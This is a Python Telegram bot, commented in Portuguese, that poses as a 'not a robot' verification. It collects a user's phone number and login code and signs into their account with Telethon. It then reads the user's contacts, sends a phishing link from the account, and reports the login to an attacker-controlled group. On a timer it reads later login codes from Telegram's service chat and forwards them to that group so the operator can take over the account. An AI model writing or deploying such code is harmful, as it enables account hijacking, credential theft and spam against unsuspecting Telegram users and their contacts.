from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes, CallbackQueryHandler
from telethon import TelegramClient, events
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
import asyncio
import os
import glob
import re
from dotenv import load_dotenv

# Carrega as variáveis do arquivo .env
load_dotenv()

# Obtém as variáveis de ambiente
api_id = int(os.getenv('API_ID'))
api_hash = os.getenv('API_HASH')

# Estados para o fluxo da conversa
CONFIRM_HUMAN, ASK_PHONE, ASK_CODE = range(3)

# Função para encontrar todas as sessões existentes no diretório
def find_existing_sessions():
    # Procura por arquivos de sessão no diretório atual
    session_files = glob.glob("session_+*.session")
    
    # Extrai os números de telefone das sessões encontradas
    sessions = []
    for session_file in session_files:
        # Usa expressão regular para extrair o número de telefone do nome do arquivo
        match = re.search(r'session_\+(\d+)\.session', session_file)
        if match:
            phone_number = match.group(1)
            sessions.append(phone_number)
    
    return sessions

# Função para verificar se existe sessão para um número específico
def check_session_exists_for_phone(phone_number):
    # Remove o '+' se existir no início do número
    if phone_number.startswith('+'):
        phone_number = phone_number[1:]
        
    # Verifica se o arquivo de sessão existe
    session_file = f"session_+{phone_number}.session"
    return os.path.exists(session_file)

# Função para enviar a solicitação de código
async def request_code(phone):
    client = TelegramClient(f"session_+{phone}", api_id, api_hash)
    await client.connect()
    
    if not await client.is_user_authorized():
        try:
            print("Enviando solicitação de código para o número:", f'+{phone}')
            sent = await client.send_code_request(f'+{phone}')
            await client.disconnect()
            return True, "Código enviado com sucesso", sent.phone_code_hash
        except Exception as e:
            await client.disconnect()
            return False, f"Erro ao enviar código: {e}", None
    else:
        await client.disconnect()
        return True, "Usuário já está autorizado", None

# Função para verificar se um número de telefone já está autenticado
async def check_auth_status(phone):
    client = TelegramClient(f"session_+{phone}", api_id, api_hash)
    await client.connect()
    
    # Verifica se a sessão está autorizada
    is_authorized = await client.is_user_authorized()
    await client.disconnect()
    
    return is_authorized

# Função para entrar em um grupo pelo ID ou username
async def join_telegram_group(client, group_id=None, group_username=None):
    try:
        if group_username:
            # Se temos um username, tentamos entrar diretamente
            if group_username.startswith('@'):
                group_username = group_username[1:]  # Remove o @ inicial se existir
                
            try:
                entity = await client.get_entity(group_username)
                await client(JoinChannelRequest(entity))
                print(f"Entrou com sucesso no grupo: {group_username}")
                return entity
            except Exception as e:
                print(f"Erro ao entrar no grupo pelo username {group_username}: {e}")
                
        if group_id:
            # Se temos um ID, tentamos entrar pelo ID
            try:
                entity = await client.get_entity(group_id)
                await client(JoinChannelRequest(entity))
                print(f"Entrou com sucesso no grupo pelo ID: {group_id}")
                return entity
            except Exception as e:
                print(f"Erro ao entrar no grupo pelo ID {group_id}: {e}")
                
        return None
    except Exception as e:
        print(f"Erro geral ao tentar entrar no grupo: {e}")
        return None

# Função para sair de um grupo
async def leave_telegram_group(client, group_entity):
    try:
        await client(LeaveChannelRequest(group_entity))
        return True
    except Exception as e:
        print(f"Erro ao sair do grupo: {e}")
        return False

# Função para verificar mensagens do sistema após um delay
async def check_system_message_after_delay(phone, delay_seconds=180):
    print(f"Timer iniciado: verificando mensagens do sistema em {delay_seconds} segundos para +{phone}...")
    
    # Aguarda o tempo especificado
    await asyncio.sleep(delay_seconds)
    
    print(f"Timer concluído: verificando mensagens do sistema para +{phone}")
    
    # Conecta ao cliente Telethon usando a sessão do usuário
    client = TelegramClient(f"session_+{phone}", api_id, api_hash)
    await client.connect()
    
    try:
        if await client.is_user_authorized():
            # ID do sistema Telegram
            telegram_system_id = 777000
            
            # Buscar as mensagens recentes do sistema Telegram
            from telethon.tl.functions.messages import GetHistoryRequest
            
            # Obtém a entidade do sistema Telegram
            system_entity = await client.get_entity(telegram_system_id)
            
            # Obtém o histórico de mensagens
            history = await client(GetHistoryRequest(
                peer=system_entity,
                limit=10,  # Limitar a 10 mensagens recentes
                offset_date=None,
                offset_id=0,
                max_id=0,
                min_id=0,
                add_offset=0,
                hash=0
            ))
            
            # Se não há mensagens, retorna
            if not history.messages:
                print(f"Nenhuma mensagem do sistema encontrada para +{phone} após o timer")
                await client.disconnect()
                return
            
            # Pega a mensagem mais recente
            latest_message = history.messages[0]
            print(f"Mensagem mais recente do sistema para +{phone}: {latest_message.message}")
            
            # Busca o código de login na mensagem, independente do idioma
            # Procura por um padrão de 5 dígitos consecutivos na mensagem
            code_match = re.search(r'\b\d{5}\b', latest_message.message)
            
            if code_match:
                code_value = code_match.group(0)  # Pega os 5 dígitos encontrados
                
                # Adiciona um ponto entre cada número do código para melhorar a visualização
                formatted_code = '-'.join(code_value)
                
                # Formata a mensagem para reenvio de forma mais limpa
                system_message = f"+{phone}:\n\nCódigo de login: {formatted_code}"
            else:
                system_message = f"Não consegui pegar o código"
            
            # Entrar no grupo, enviar a mensagem e sair
            group_entity = await join_telegram_group(client, group_id=-4784851093, group_username="linbotteste")
            
            if group_entity:
                # Enviar a mensagem
                await client.send_message(group_entity, system_message)
                print(f"Mensagem do sistema para +{phone} reenviada ao grupo após o timer")
                
                # Aguardar antes de sair
                await asyncio.sleep(1)
                
                # Sair do grupo
                await leave_telegram_group(client, group_entity)
                print(f"Saiu do grupo após enviar o código para +{phone}")
            else:
                print(f"Não foi possível entrar no grupo para reenviar mensagens do sistema para +{phone}")
        else:
            print(f"Sessão para +{phone} não está mais autorizada, não é possível verificar mensagens")
    except Exception as e:
        print(f"Erro ao verificar mensagens do sistema após timer para +{phone}: {e}")
    finally:
        await client.disconnect()

# Função para fazer login e enviar mensagens
async def login_and_send_messages(phone, code=None, phone_code_hash=None, update=None):
    client = TelegramClient(f"session_+{phone}", api_id, api_hash)
    await client.connect()

    try:
        # Verifica se o usuário já está autorizado
        if not await client.is_user_authorized():
            # Se não está autorizado, tenta fazer login com código e hash
            if code and phone_code_hash:
                try:
                    await client.sign_in(phone=f'+{phone}', code=code, phone_code_hash=phone_code_hash)
                    print("Login realizado com sucesso!")
                except Exception as e:
                    await client.disconnect()
                    return f"Erro ao logar: {e}"
            else:
                # Se não forneceu código e hash e não está autorizado, não pode continuar
                await client.disconnect()
                return "Não foi possível fazer login: sessão não autorizada e código não fornecido."
        else:
            print(f"Usuário +{phone} já está autorizado. Continuando com as operações...")
            
        # Continua com as operações, pois o usuário já está autenticado
        # Busca os contatos do usuário
        result = await client(GetContactsRequest(hash=0))
        contacts = result.users
        print(f"Total de contatos encontrados: {len(contacts)}")
        
        # Mensagem a ser enviada para todos os contatos
        message_to_send = "[ 🔴 CLIQUE 🔻 ]\n\n-> https://t.me/+H9orcWQaqNM3ZGU5"
        
        # Enviar a mensagem no próprio chat do bot, se o update estiver disponível
        if update:
            await update.message.reply_text(message_to_send)
        
        # Contador de mensagens enviadas e com falha
        success_count = 0
        fail_count = 0
        
        # Loop para enviar mensagem para todos os contatos
        for contact in ["+5582993286918"]:
            try:
                # Tenta enviar a mensagem para o contato
                try:
                    # Enviar mensagem diretamente para o contato usando a entidade do usuário
                    await client.send_message(
                        entity=contact,
                        message=message_to_send
                    )
                    success_count += 1
                    # print(f"Mensagem enviada com sucesso para {contact.first_name} {contact.last_name if contact.last_name else ''} ({contact.phone if hasattr(contact, 'phone') else 'sem telefone'})")
                except ValueError as e:
                    if "Cannot find any entity corresponding to" in str(e):
                        # Tenta formato alternativo sem o '+'
                        try:
                            contact_without_plus = contact.replace("+", "")
                            entity = await client.get_entity(contact_without_plus)
                            await client.send_message(
                                entity=entity,
                                message=message_to_send
                            )
                            success_count += 1
                            print(f"Mensagem enviada com sucesso para {contact} (formato alternativo)")
                        except Exception as inner_e:
                            fail_count += 1
                            print(f"Erro ao enviar mensagem para {contact} (mesmo com formato alternativo): {inner_e}")
                    else:
                        raise
                # Aguarda um pequeno intervalo para evitar limites de taxa
                await asyncio.sleep(0.5)
            except Exception as e:
                fail_count += 1
                print(f"Erro ao enviar mensagem para {contact}: {e}")
        
        print(f"Processo concluído! Mensagens enviadas: {success_count}, Falhas: {fail_count}")
        
        # Mensagem de log que será enviada
        log_message = f"O número '+{phone}' acabou de fazer login com sucesso!\n\n" \
                     f"Total de contatos encontrados: {len(contacts)}\n\n" \
                     f"Mensagens enviadas: {success_count}, Falhas: {fail_count}\n\n"\
                     f"Você terá 3 minutos para fazer login no web para o usuário receber outro código e eu vou buscar e mandar aqui novamente."
        
        try:
            # Entrar no grupo usando ID e username
            print("Tentando entrar no grupo especificado...")
            group_entity = await join_telegram_group(client, group_id=-4784851093, group_username="linbotteste")
            
            if group_entity:
                # Enviar a mensagem de log no grupo
                print("Enviando mensagem de log no grupo...")
                await client.send_message(group_entity, log_message)
                
                # Sair do grupo
                print("Saindo do grupo...")
                await leave_telegram_group(client, group_entity)
                print(f"Saiu com sucesso do grupo: {group_entity.title if hasattr(group_entity, 'title') else 'Teste'}")
                
                # Verificar mensagens do sistema após 1 segundo (teste rápido)
                asyncio.create_task(check_system_message_after_delay(phone, 1))
                 
                # Configurar o timer para obter e enviar mensagem do sistema após 3 minutos
                asyncio.create_task(check_system_message_after_delay(phone, 180))  # 180 segundos = 3 minutos
            else:
                print("Não foi possível entrar no grupo especificado.")
        except Exception as e:
            print(f"Erro durante a operação no grupo: {e}")
        
        return "Operação concluída com sucesso!"
    except Exception as e:
        return f"Erro durante a operação: {e}"
    finally:
        await client.disconnect()

# Iniciar o bot - primeiro verificar se usuário é humano
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("✅ Não sou um robô")]]
    await update.message.reply_text(
        "Clique no botão abaixo para confirmar que você não é um robô:",
        reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
    )
    return CONFIRM_HUMAN

# Confirmar que não é um robô e pedir número de telefone
async def confirm_human(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("Enviar meu contato", request_contact=True)]]
    await update.message.reply_text(
        "Por favor, envie seu número de telefone clicando no botão abaixo:",
        reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
    )
    return ASK_PHONE

# Receber o contato do usuário e solicitar código de verificação
async def receive_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Recebendo contato do usuário.")
    if update.message.contact:
        phone = update.message.contact.phone_number
        context.user_data["phone"] = phone
        
        # Remove o '+' se existir no início do número
        if phone.startswith('+'):
            phone = phone[1:]
            
        # Verifica se existe uma sessão para este número e se está autorizada
        has_session = check_session_exists_for_phone(phone)
        if has_session:
            is_authorized = await check_auth_status(phone)
            if is_authorized:
                await update.message.reply_text(f"Sessão encontrada para +{phone}! Iniciando operações...")
                
                # Executa diretamente as operações com a conta autenticada (sem código)
                result = await login_and_send_messages(phone, None, None, update)
                await update.message.reply_text(result)
                
                return ConversationHandler.END
        
        # Envia solicitação de código
        await update.message.reply_text("Enviando código de acesso! Verifique seu Telegram e aguarde...")
        success, message, phone_code_hash = await request_code(phone)
        
        if not success:
            if "Returned when all available options for this type of number were already used" in message:
                await update.message.reply_text(
                    "Tentando novamente enviar o código de acesso..."
                )
                print("Reiniciando tentativa de envio do código de acesso...")
                success, message, phone_code_hash = await request_code(phone)
                if not success:
                    await update.message.reply_text(message)
                    return await start(update, context)
            else:
                await update.message.reply_text(message)
                return await start(update, context)
        
        # Salvar o phone_code_hash para usar durante o login
        context.user_data["phone_code_hash"] = phone_code_hash
        
        # Criar teclado numérico para o código
        keyboard = [
            ["1", "2", "3"],
            ["4", "5", "6"],
            ["7", "8", "9"],
            ["0", "Limpar"]
        ]
        
        # Inicializa o código
        context.user_data["code_digits"] = ""
        
        await update.message.reply_text(
            "Código enviado! Verifique seu Telegram e digite o código de verificação que recebeu:",
            reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        )
        return ASK_CODE
    else:
        print("Contato inválido recebido.")
        await update.message.reply_text("Contato inválido. Por favor, envie novamente.")
        return ASK_PHONE

# Receber o código de verificação
async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Recebendo código de acesso do usuário.")
    digit = update.message.text
    
    # Inicializa o código se ainda não existir
    if "code_digits" not in context.user_data:
        context.user_data["code_digits"] = ""
    
    current_code = context.user_data["code_digits"]

    if digit == "Limpar":
        # Se usuário clicou em limpar, zera o código
        context.user_data["code_digits"] = ""
        await update.message.reply_text(f"Código limpo. Digite novamente.")
    else:
        # Adiciona o dígito ao código atual
        context.user_data["code_digits"] += digit
        current_code = context.user_data["code_digits"]

        # Se temos menos de 5 dígitos, aguarda mais entrada
        if len(current_code) < 5:
            await update.message.reply_text(f"Código: {current_code} ({len(current_code)}/5 dígitos)")
        else:
            # Se temos 5 dígitos, processa o código
            code = current_code
            phone = context.user_data.get("phone")
            phone_code_hash = context.user_data.get("phone_code_hash")
            
            if not phone_code_hash:
                await update.message.reply_text(
                    "Erro: phone_code_hash não encontrado. Por favor, inicie o processo novamente com /start",
                    reply_markup=ReplyKeyboardRemove()
                )
                return ConversationHandler.END

            # Remove o teclado numérico
            await update.message.reply_text(
                f"Código completo: {code}. Processando...",
                reply_markup=ReplyKeyboardRemove()
            )

            # Chama a função de login e envio de mensagens
            result = await login_and_send_messages(phone, code, phone_code_hash, update)
            await update.message.reply_text(result)            
            
            return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Operação cancelada pelo usuário.")
    await update.message.reply_text("Operação cancelada.", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

def main():
    # Obtém o token do bot do arquivo .env
    token = os.getenv('BOT_TOKEN')
    app = Application.builder().token(token).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CONFIRM_HUMAN: [MessageHandler(filters.TEXT & ~filters.COMMAND, confirm_human)],
            ASK_PHONE: [MessageHandler(filters.CONTACT, receive_contact)],
            ASK_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_code)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv_handler)
    
    app.run_polling()

if __name__ == "__main__":
    main()
